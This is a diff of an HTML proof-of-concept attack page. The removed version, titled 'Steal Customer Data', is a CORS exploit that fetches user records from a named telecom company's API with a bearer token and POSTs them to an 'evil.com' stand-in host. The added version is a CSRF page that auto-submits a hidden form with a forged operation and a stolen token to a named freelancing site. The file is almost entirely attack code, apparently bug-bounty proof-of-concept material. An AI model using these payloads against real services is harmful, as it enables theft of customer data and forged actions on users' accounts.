@@ -1,65 +1,10 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Steal Customer Data</title>
-    <style>
-        /* Style for the inline button */
-        .inline-button {
-            display: inline-block;
-            padding: 10px 100px;
-            font-size: 16px;
-            text-align: center;
-            border-radius: 20px;
-            background-color: #007bff;
-            color: #ffffff;
-            text-decoration: none;
-            border: none;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-            color: black;
-            font-size: large;
-            font-weight: 700;
-        }
-    
-        /* Hover effect */
-        .inline-button:hover {
-            background-color: #0056b3;
-        }
-    </style>
-    </head>
-    <body>
-</head>
-<body>
-    <button type="button" onclick="cors()" class="inline-button" >EXPLOIT</button>
-    <p id="demo"></p>
-    <script>
-   function cors(){
-    var xhttp = new XMLHttpRequest();
-
-    // Make an authenticated request to the Vodafone API
-    xhttp.open("GET", "https://vodafone.om/api/backend/ajax/v1/users", true);
-    xhttp.setRequestHeader("Authorization", "Bearer your-jwt-token"); // Add JWT token here
-    xhttp.setRequestHeader("Content-type", "application/json"); 
-    xhttp.send();
-
-    xhttp.onreadystatechange = function(){
-        if(this.readyState == 4 && this.status == 200) {
-            var response = this.responseText; 
-            document.getElementById("demo").innerHTML = response;
-            console.log(response);
-
-            // Sending data to the malicious server (Ensure this URL is correct)
-            var maliciousRequest = new XMLHttpRequest();
-            maliciousRequest.open("POST", "https://salamoxso.github.io/evil.com/", true); // Correct the URL here
-            maliciousRequest.setRequestHeader("Content-type", "application/json");
-            maliciousRequest.send(JSON.stringify({ data: response }));
-        }
-    };
-}
-
-
-    </script>
-</body>
+<!-- Malicious webpage to trick users into making unintended requests -->
+<html>
+  <body>
+    <form action="https://www.freelancer.com/users/onRequestCall.php" method="post">
+      <input type="hidden" name="operation" value="maliciousOperation">
+      <input type="hidden" name="csrf_token" value="stolenCSRFToken">
+    </form>
+    <script>document.forms.submit();</script>
+  </body>
 </html>
